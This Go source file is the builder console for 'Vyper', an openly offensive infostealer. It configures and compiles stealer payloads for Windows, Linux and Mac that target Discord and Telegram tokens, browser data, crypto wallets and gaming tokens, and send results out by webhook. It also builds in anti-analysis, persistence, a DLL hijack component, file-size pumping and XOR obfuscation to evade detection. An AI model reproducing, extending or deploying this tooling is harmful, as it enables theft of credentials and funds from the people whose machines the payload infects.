package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"

	"github.com/bigkevmcd/go-configparser"
)

// making an enum so stuff in futre will be more readable
const (
	_ = iota
	VAL_ANTIANALYSIS
	VAL_PERSISTANCE
	VAL_SELFDESTRUCT
	VAL_DISCORD
	VAL_BROWSER
	VAL_CRYPTOWALLETS
	VAL_GAMINGTOKENS
	VAL_WEBHOOKTOGGLE
	VAL_DATAPUMPERTOGGLE
	VAL_XOROBF
	VAL_WEBHOOKURL
	VAL_PUMPERAMMOUNT
)

// default values
var antianalysis bool = true
var persist bool = false
var selfdestruct bool = false
var discord bool = true
var browser bool = true
var crypto bool = true
var gaming bool = true
var webhook bool = false
var pumper bool = false
var xorobf bool = false

// suboptions
var webhookurl string = "undefined"
var pumpammnt int = 0

func clearscreen() {
	var cmd *exec.Cmd //just clearing screen upon open
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func help(command string) {
	switch command {
	case "help":
		fmt.Printf("\n[COMMANDS]\n\n")
		fmt.Printf("options (shows current options)\n")
		fmt.Printf("set [OPTION #] [VALUE] (sets a valued variable)\n")
		fmt.Printf("toggle [OPTION #] (toggles a true/false variable)\n")
		fmt.Printf("build [PLATFORM] (builds the stealer)\n")
		fmt.Printf("clearscreen/clear (clears the screen)\n")
		fmt.Printf("exit (exits the program)\n\n")
		fmt.Printf("use help [COMMAND] for more detailed info on each command\n\n")
	case "options":
		fmt.Printf("\n[OPTIONS HELP]\n\n")
		fmt.Printf("OPTION STRUCTURE: [OPTION NUMBER]option [VALUED/EMPTY]: [VALUE]\n\n")
		fmt.Printf("The options command generates an array of the current stealer options showing whether they are enabled or disables, and displays suboptions base on if certain options are toggled\n\n")
	case "set":
		fmt.Printf("\n[SET HELP]\n\n")
		fmt.Printf("USAGE: set [OPTION NUMBER] [VALUE]\n\n")
		fmt.Printf("The set command sets a specific value to options marked [VALUED] after running the options command (usually are suboptions)\n\n")
	case "toggle":
		fmt.Printf("\n[TOGGLE HELP]\n\n")
		fmt.Printf("USAGE: toggle [OPTION NUMBER]\n\n")
		fmt.Printf("The toggle command toggles a boolean (true/false) value on an option shown after running the options command\n\n")
	case "build":
		fmt.Printf("\n[BUILD HELP]\n\n")
		fmt.Printf("USAGE: build [LINUX/WINDOWS/MAC]\n\n")
		fmt.Printf("The build command uses all the options chosen and builds the stealer in whatever platform you want to\n\n")
	case "exit", "clearscreen", "clear":
		fmt.Printf("\nIts in the name dipshit\n\n")
	default:
		fmt.Printf("\nINVALID HELP OPTION (not recognized): %v\n", command)
	}
}

func printoptions() { //only making another function to preserve readability in main
	fmt.Printf("\n[STEALER OPTIONS]\n")
	fmt.Printf("[1]Anti analysis: %t                    [2]Persistance: %t    [3]Self Destruct: %t\n", antianalysis, persist, selfdestruct)
	fmt.Printf("[4]Messaging (Discord, Telegram): %t    [5]Browser: %t        [6]Crypto Wallets: %t\n", discord, browser, crypto)
	fmt.Printf("[7]Gaming Token Grabber: %t             [8]Webhook: %t\n\n", gaming, webhook)
	fmt.Printf("[BUILDER OPTIONS]\n")
	fmt.Printf("[9]Data Pumper: %t                      [10]Obfuscation: %t\n\n", pumper, xorobf)

	if webhook {
		fmt.Printf("[WEBHOOK OPTIONS]\n")
		fmt.Printf("[11]Webhook URL [VALUED]: %v\n\n", webhookurl)
	}
	if pumper {
		fmt.Printf("[PUMPER OPTIONS]\n")
		fmt.Printf("[12]Pumper ammount [VALUED IN MB]: %v\n\n", pumpammnt)
	}
}

func parsecmd(command string) []string {

	var finalargs []string
	var currentarg string

	for i := 0; i < len(command); i++ {
		if command[i] == ' ' {
			finalargs = append(finalargs, currentarg)
			currentarg = ""
		} else {
			currentarg += string(command[i])
		}
	}

	if currentarg != "" {
		finalargs = append(finalargs, currentarg)
	}

	return finalargs
}

func toggle(option int) {
	switch option {
	case VAL_ANTIANALYSIS:
		antianalysis = !antianalysis
	case VAL_PERSISTANCE:
		persist = !persist
	case VAL_SELFDESTRUCT:
		selfdestruct = !selfdestruct
	case VAL_DISCORD:
		discord = !discord
	case VAL_BROWSER:
		browser = !browser
	case VAL_CRYPTOWALLETS:
		crypto = !crypto
	case VAL_GAMINGTOKENS:
		gaming = !gaming
	case VAL_WEBHOOKTOGGLE:
		webhook = !webhook
	case VAL_DATAPUMPERTOGGLE:
		pumper = !pumper
	case VAL_XOROBF:
		xorobf = !xorobf
	default:
		fmt.Printf("\nINVALID OPTION NUMBER (option does not exist or is not for this category): %v\n", option)
	}
}

func set(option int, value string) {
	switch option {
	case VAL_WEBHOOKURL:
		webhookurl = value
	case VAL_PUMPERAMMOUNT:
		intstr, err := strconv.Atoi(value)
		if err == nil {
			pumpammnt = intstr
		} else {
			fmt.Printf("\nINVALID PUMP AMMOUNT (not integer): %v\n", value)
		}
	default:
		fmt.Printf("\nINVALID OPTION NUMBER (option does not exist or is not for this category): %v\n", option)
	}
}

func xorcrypt(data []byte, key []byte) []byte {
	output := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		output[i] = data[i] ^ key[i%len(key)]
	}
	return output
}

func build(platform string) {
	fmt.Printf("\nConfiguring...\n")
	file, _ := os.Create("Stub/config.ini")

	config, _ := configparser.NewConfigParserFromFile("Stub/config.ini")

	//damn this shit is ugly but it works
	config.AddSection("main_toggles")
	config.Set("main_toggles", "antianalysis", strconv.FormatBool(antianalysis))
	config.Set("main_toggles", "persist", strconv.FormatBool(persist))
	config.Set("main_toggles", "selfdestruct", strconv.FormatBool(selfdestruct))
	config.Set("main_toggles", "discord", strconv.FormatBool(discord))
	config.Set("main_toggles", "browser", strconv.FormatBool(browser))
	config.Set("main_toggles", "crypto", strconv.FormatBool(crypto))
	config.Set("main_toggles", "gaming", strconv.FormatBool(gaming))
	config.Set("main_toggles", "webhook", strconv.FormatBool(webhook))

	if webhook && webhookurl != "" {
		config.AddSection("webhook_info")
		config.Set("webhook_info", "url", webhookurl)
	}
	config.SaveWithDelimiter("Stub/config.ini", ":")
	file.Close()

	var cmd *exec.Cmd
	var platformspecific *exec.Cmd

	switch strings.ToLower(platform) {
	case "linux":
		fmt.Printf("Compiling platform specifics for linux...\n")
		platformspecific = exec.Command("go", "build", "-ldflags=-s -w", "-o", "Stub/infostealer/cryptunprotectwine.exe", "Stub/infostealer/cryptunprotectwine/wine_exe.go")
		platformspecific.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
	case "windows":
		fmt.Printf("Compiling platform specifics for windows...")
		platformspecific = exec.Command("go", "build", "-buildmode=c-shared", "-ldflags=-s -w", "-o", "Stub/infostealer/v20.dll", "Stub/infostealer/v20hijack/dll.go")
		platformspecific.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=1")
	}

	if strings.ToLower(platform) != "mac" {
		platformspecific.Stdout = os.Stdout
		platformspecific.Stderr = os.Stderr

		err := platformspecific.Run()
		if err != nil {
			fmt.Printf("Compilation failed. %v.\n", err)
			fmt.Printf("Done!\n\n")
			return
		}
	}

	switch strings.ToLower(platform) {
	case "windows":
		fmt.Printf("Compiling main payload for Windows...\n")
		cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", "Stub/payload.exe", "Stub/stub.go")
		cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
	case "linux":
		fmt.Printf("Compiling main payload for Linux...\n")
		cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", "Stub/payload", "Stub/stub.go")
		cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")
	case "mac":
		fmt.Printf("Compiling main payload for Mac OS...\n")
		cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", "Stub/payload", "Stub/stub.go")
		cmd.Env = append(os.Environ(), "GOOS=darwin", "GOARCH=amd64")
	}

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Run()
	if err != nil {
		fmt.Printf("Compilation failed. %v\n", err)
		fmt.Printf("Done!\n\n")
		return
	}
	fmt.Printf("Main payload compiled!\n")

	if pumper {
		fmt.Printf("Pumping data...\n")
		filename := "Stub/payload"
		if strings.ToLower(platform) == "windows" {
			filename += ".exe"
		}

		data, _ := os.ReadFile(filename)
		paddingsize := pumpammnt * 1024 * 1024
		padding := make([]byte, paddingsize)

		data = append(data, padding...)
		os.WriteFile(filename, data, 0755)
		fmt.Printf("Data pumped!\n")
	}

	if xorobf {
		fmt.Printf("Obfuscating with xor...\n")
		key := []byte("OhShitILeftMyXorKeyInThePublicRelease") //change if you want to but make sure to change in xor.go
		filename := "Stub/payload"
		if strings.ToLower(platform) == "windows" {
			filename += ".exe"
		}
		data, _ := os.ReadFile(filename)
		crypted := xorcrypt(data, key)
		os.WriteFile("Stub/xor/payload.enc", crypted, 0644)
		fmt.Printf("Done obfuscating with xor!\n")

		os.Mkdir("bin", 0755)
		switch strings.ToLower(platform) {
		case "windows":
			fmt.Printf("Compiling xor payload for Windows...\n")
			cmd = exec.Command("go", "build", "-H=windowsgui -ldflags=-s -w", "-o", "bin/payload.exe", "Stub/xor/xor.go")
			cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
		case "linux":
			fmt.Printf("Compiling xor payload for Linux...\n")
			cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", "bin/payload", "Stub/xor/xor.go")
			cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")
		case "mac":
			fmt.Printf("Compiling xor payload for Mac OS\n")
			cmd = exec.Command("go", "build", "-ldflags=-s -w", "-o", "bin/payload", "Stub/xor/xor.go")
		}

		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		err := cmd.Run()
		if err != nil {
			fmt.Printf("Xor compilation failed.\n")
			fmt.Printf("Done!\n\n")
			return
		}
		fmt.Printf("Xor payload compiled!\n")

	} else {
		os.Mkdir("bin", 0755)
		switch strings.ToLower(platform) {
		case "linux":
			data, _ := os.ReadFile("Stub/payload")
			os.WriteFile("bin/payload", data, 0755)
		case "windows":
			data, _ := os.ReadFile("Stub/payload.exe")
			os.WriteFile("bin/payload.exe", data, 0755)
		}
	}

	fmt.Printf("Done! Cleaning...\n\n")
	switch strings.ToLower(platform) {
	case "mac":
		os.Remove("Stub/payload")
	case "linux":
		os.Remove("Stub/payload")
		os.Remove("Stub/infostealer/cryptunprotectwine.exe")
	case "windows":
		os.Remove("Stub/payload.exe")
		os.Remove("Stub/infostealer/v20.dll")
	}
	os.Remove("Stub/config.ini")
	if xorobf {
		os.Remove("Stub/xor/payload.enc")
	}
}

func main() {
	clearscreen()
	fmt.Println(`
 __     __                       ____  _             _
 \ \   / /   _ _ __   ___ _ __  / ___|| |_ ___  __ _| | ___ _ __
  \ \ / / | | | |_ \ / _ \ '__| \___ \| __/ _ \/ _  | |/ _ \ '__|
   \ V /| |_| | |_) |  __/ |     ___) | ||  __/ (_| | |  __/ |
    \_/  \__, | .__/ \___|_|    |____/ \__\___|\__,_|_|\___|_|
         |___/|_|

Vyper version 0.0 Development

`)

	user, _ := user.Current()
	scanner := bufio.NewScanner(os.Stdin)

	var command string

	for {
		fmt.Printf("%v@Vyper: ", user.Username)
		if scanner.Scan() {
			command = scanner.Text()
		}
		args := parsecmd(command)
		switch strings.ToLower(args[0]) {
		case "help":
			if len(args) > 1 {
				help(args[1])
			} else {
				help("help")
			}
		case "options":
			printoptions()
		case "set":
			if len(args) < 3 {
				fmt.Printf("\nINVALID ARGUMENT SIZE (missing one or multiple arguments)\n")
			} else {
				optionnum, err := strconv.Atoi(args[1])
				if err == nil {
					set(optionnum, args[2])
				} else {
					fmt.Printf("\nINVALID OPTION NUMBER (not an integer): %v\n", args[1])
				}
			}
		case "toggle":
			if len(args) < 2 {
				fmt.Printf("\nINVALID ARGUMENT SIZE (missing option number)\n")
			} else {
				optionnum, err := strconv.Atoi(args[1])
				if err == nil {
					toggle(optionnum)
				} else {
					fmt.Printf("\nINVALID OPTION NUMBER (not an integer): %v\n", args[1])
				}
			}
		case "clearscreen", "clear":
			clearscreen()
		case "build":
			if len(args) < 2 {
				fmt.Printf("\nINVALID ARGUMENT SIZE (missing platform)\n")
			} else {
				build(args[1])
			}
		case "exit":
			os.Exit(0)
		default:
			fmt.Printf("\nINFVALID ARGUMENT (RUN HELP TO SEE ALL COMMANDS): %v\n", args[0])
		}
	}
}
